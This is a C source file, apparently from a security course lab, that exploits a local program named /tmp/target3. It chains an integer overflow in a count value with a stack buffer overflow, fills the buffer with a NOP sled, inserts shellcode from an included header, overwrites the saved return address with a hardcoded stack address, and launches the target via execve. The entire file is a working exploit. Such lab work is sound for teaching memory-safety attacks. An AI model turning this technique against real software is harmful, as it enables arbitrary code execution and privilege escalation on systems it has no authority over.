#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target3"

int main(void)
{
  char *args[3];
  char *env[1];
  int i;
  int j;

  // Make size of buffer one extra widget size over to overflow
  char buf[914 * (sizeof(double) * 8)];
  
  // Get overflowed number such that when the overflowed
  // negative number is multiplied to count in target3.c
  // it is the size of our exploit buffer 
  char overflow[11] = "2147484562,";

  // Fill buffer with NOPs initially
  for (i = 0; i < 914 * sizeof(double) * 8; i++) {
    buf[i] = 0x90;

  }
  
  // Put overflow number at the beginning
  // so it gets passed into counts in target3
  for (i = 0; i < 11; i++) {
    buf[i] = overflow[i];
  }
    
  // Add shellcode right before eip address
  j = 0;
  for (i = 913 * 64 - 22; i < 913 * 64 + 23; i++) {
    buf[i] = shellcode[j];
    j++;
  }
  
  // Overwrite eip with address to NOP sled
  buf[913 * 64 + 23] = 0x34;
  buf[913 * 64 + 24] = 0x19;
  buf[913 * 64 + 25] = 0xff;
  buf[913 * 64 + 26] = 0xbf;
  

  args[0] = TARGET; args[1] = buf; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
